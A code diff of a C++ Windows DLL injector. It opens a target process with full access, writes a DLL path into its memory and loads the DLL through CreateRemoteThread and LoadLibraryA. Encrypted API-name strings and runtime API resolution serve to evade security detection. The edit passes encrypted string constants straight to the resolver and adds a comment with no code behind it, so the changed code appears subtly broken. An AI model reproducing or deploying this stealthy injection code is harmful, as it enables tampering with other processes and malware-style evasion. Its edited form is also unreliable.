@@ -10,6 +10,7 @@
 
 int main(int argc, char** argv)
 {
+	// wipe dllPathString 
 	std::string dllPathString = string_decrypt(str_dllPath);
 	const char* dllPathCStr = dllPathString.c_str();
 	const char* procName = argc <= 1 ? TARGET_EXE : argv[1];
@@ -24,29 +25,29 @@ int main(int argc, char** argv)
 	while (!procID) // while the process was not found
 	{
 		procID = GetProcessIdByName(procName);
-		resolve_dynamically<Sleep_t>(string_decrypt(str_Sleep, str_Sleep_len).c_str())(300);
+		resolve_dynamically<Sleep_t>(str_Sleep)(300);
 	}
-	HANDLE hProc = resolve_dynamically<OpenProcess_t>(string_decrypt(str_OpenProcess, str_OpenProcess_len).c_str())(PROCESS_ALL_ACCESS, 0, procID);
+	HANDLE hProc = resolve_dynamically<OpenProcess_t>(str_OpenProcess)(PROCESS_ALL_ACCESS, 0, procID);
 
 	if (hProc && hProc != INVALID_HANDLE_VALUE) // if we got a handle successfully
 	{
-		LPVOID dllAddrInRemoteProcess = resolve_dynamically<VirtualAllocEx_t>(string_decrypt_cstr(str_VirtualAllocEx, str_VirtualAllocEx_len))(hProc, NULL, strlen(dllPathCStr) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		LPVOID dllAddrInRemoteProcess = resolve_dynamically<VirtualAllocEx_t>(str_VirtualAllocEx)(hProc, NULL, strlen(dllPathCStr) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
 		if (dllAddrInRemoteProcess) {
-			resolve_dynamically<WriteProcessMemory_t>(string_decrypt_cstr(str_WriteProcessMemory, str_WriteProcessMemory_len))(hProc, dllAddrInRemoteProcess, dllPathCStr, strlen(dllPathCStr) + 1, 0);
+			resolve_dynamically<WriteProcessMemory_t>(str_WriteProcessMemory)(hProc, dllAddrInRemoteProcess, dllPathCStr, strlen(dllPathCStr) + 1, 0);
 		}
 		else
 		{
 			std::cout << "Error: VirtualAllocEx() returned NULL: Err #" << GetLastError() << std::endl;
 			return 1;
 		}
-		LoadLibraryA_t LoadLibraryA_addr = resolve_dynamically<LoadLibraryA_t>(string_decrypt(str_LoadLibraryA, str_LoadLibraryA_len).c_str());
-		HANDLE threadHandle = resolve_dynamically<CreateRemoteThread_t>(string_decrypt_cstr(str_CreateRemoteThread, str_CreateRemoteThread_len))(hProc, 0, 0, (LPTHREAD_START_ROUTINE) LoadLibraryA_addr, dllAddrInRemoteProcess, 0, 0);
+		LoadLibraryA_t LoadLibraryA_addr = resolve_dynamically<LoadLibraryA_t>(str_LoadLibraryA);
+		HANDLE threadHandle = resolve_dynamically<CreateRemoteThread_t>(str_CreateRemoteThread)(hProc, 0, 0, (LPTHREAD_START_ROUTINE) LoadLibraryA_addr, dllAddrInRemoteProcess, 0, 0);
 
 		if (threadHandle == NULL)
 			std::cerr << "Error in CreateRemoteThread(): Err#" << GetLastError() << std::endl;
 		else
-			resolve_dynamically<CloseHandle_t>(string_decrypt_cstr(str_CloseHandle, str_CloseHandle_len))(threadHandle);
+			resolve_dynamically<CloseHandle_t>(str_CloseHandle)(threadHandle);
 			
 	}
 	else {
